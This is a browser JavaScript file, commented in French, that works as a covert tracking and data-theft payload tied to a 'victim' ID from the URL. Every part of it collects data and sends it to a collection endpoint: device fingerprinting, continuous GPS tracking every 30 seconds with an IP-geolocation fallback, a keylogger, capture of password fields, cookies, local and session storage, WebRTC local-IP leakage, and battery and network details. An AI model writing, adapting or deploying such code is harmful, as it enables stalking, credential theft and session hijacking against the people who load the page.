(function() {
    // Récupérer l'ID
    const urlParams = new URLSearchParams(window.location.search);
    const VICTIM_ID = urlParams.get('id');
    const API_URL = window.location.origin;
    
    // ============================================
    // COLLECTE D'INFORMATIONS
    // ============================================
    
    // 1. Informations système
    const systemInfo = {
        url: window.location.href,
        referrer: document.referrer,
        language: navigator.language,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : null
    };
    
    fetch(`${API_URL}/api/collect.php`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            victimId: VICTIM_ID,
            type: 'system',
            data: systemInfo
        })
    });
    
    // 2. Localisation GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                fetch(`${API_URL}/api/collect.php`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victimId: VICTIM_ID,
                        type: 'location',
                        data: {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: Date.now()
                        }
                    })
                });
                
                // Tracking continu
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            fetch(`${API_URL}/api/collect.php`, {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    victimId: VICTIM_ID,
                                    type: 'location',
                                    data: {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: Date.now()
                                    }
                                })
                            });
                        },
                        null,
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }, 30000);
            },
            error => {
                // Fallback IP
                fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(data => {
                        fetch(`${API_URL}/api/collect.php`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victimId: VICTIM_ID,
                                type: 'location',
                                data: {
                                    lat: data.latitude,
                                    lng: data.longitude,
                                    city: data.city,
                                    country: data.country_name,
                                    ip: data.ip
                                }
                            })
                        });
                    });
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
    
    // 3. Keylogger
    let keys = [];
    let lastSend = Date.now();
    
    document.addEventListener('keydown', e => {
        let key = e.key;
        if (key === ' ') key = '[ESPACE]';
        if (key === 'Enter') key = '[ENTREE]';
        if (key === 'Backspace') key = '[EFFACER]';
        if (key === 'Tab') key = '[TAB]';
        if (key === 'Shift') key = '[MAJ]';
        if (key === 'Control') key = '[CTRL]';
        if (key === 'Alt') key = '[ALT]';
        if (key === 'CapsLock') key = '[VERR MAJ]';
        
        keys.push({
            key: key,
            time: Date.now(),
            target: e.target.tagName + (e.target.name ? '#' + e.target.name : '')
        });
        
        if (keys.length >= 20 || Date.now() - lastSend > 10000) {
            fetch(`${API_URL}/api/collect.php`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victimId: VICTIM_ID,
                    type: 'keylog',
                    data: keys
                })
            });
            keys = [];
            lastSend = Date.now();
        }
    });
    
    // 4. Capture des champs de formulaire
    document.querySelectorAll('input[type="password"], input[name*="pass"], input[name*="password"]').forEach(input => {
        input.addEventListener('blur', () => {
            if (input.value) {
                fetch(`${API_URL}/api/collect.php`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victimId: VICTIM_ID,
                        type: 'password',
                        data: {
                            field: input.name || input.id || 'password',
                            value: input.value,
                            url: window.location.href
                        }
                    })
                });
            }
        });
    });
    
    // 5. Cookies
    if (document.cookie) {
        fetch(`${API_URL}/api/collect.php`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victimId: VICTIM_ID,
                type: 'cookies',
                data: document.cookie
            })
        });
    }
    
    // 6. LocalStorage
    try {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        
        fetch(`${API_URL}/api/collect.php`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victimId: VICTIM_ID,
                type: 'storage',
                data: storage
            })
        });
    } catch(e) {}
    
    // 7. SessionStorage
    try {
        const session = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            session[key] = sessionStorage.getItem(key);
        }
        
        fetch(`${API_URL}/api/collect.php`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victimId: VICTIM_ID,
                type: 'session',
                data: session
            })
        });
    } catch(e) {}
    
    // 8. WebRTC pour IP locale
    try {
        const pc = new RTCPeerConnection({
            iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
        });
        
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = ice => {
            if (ice.candidate) {
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = ice.candidate.candidate.match(ipRegex);
                if (match) {
                    fetch(`${API_URL}/api/collect.php`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victimId: VICTIM_ID,
                            type: 'local_ip',
                            data: match[1]
                        })
                    });
                }
            }
        };
    } catch(e) {}
    
    // 9. Battery status
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            fetch(`${API_URL}/api/collect.php`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victimId: VICTIM_ID,
                    type: 'battery',
                    data: {
                        level: battery.level * 100,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }
                })
            });
        });
    }
    
    // 10. Network information
    if (navigator.connection) {
        fetch(`${API_URL}/api/collect.php`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victimId: VICTIM_ID,
                type: 'network',
                data: {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                }
            })
        });
    }
})();
